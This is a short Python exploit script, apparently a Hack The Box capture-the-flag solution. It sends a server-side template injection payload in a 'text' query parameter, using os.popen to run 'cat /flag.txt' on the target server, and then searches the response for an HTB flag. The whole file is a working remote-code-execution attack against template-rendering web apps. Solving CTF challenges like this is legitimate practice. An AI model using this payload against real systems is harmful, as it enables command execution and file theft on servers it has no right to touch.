import sys
import requests
import re


def read_flag(url):

    stock_path="/?text=${self.module.cache.util.os.popen(%27cat%20/flag.txt%27).read()}"
    response = requests.get(url + stock_path, verify=False)
    
    match = re.findall(r"HTB\{.*?\}", response.text)
    if match:
        print("Found:", match)
    else:
        print("HTB not found.")

def main():

    if len(sys.argv) != 2:

        print("You must enter an input !!!")
        print("Example: %s www.example.com "% sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("Program is runing....")
    read_flag(url)

if __name__ == "__main__":
    main()
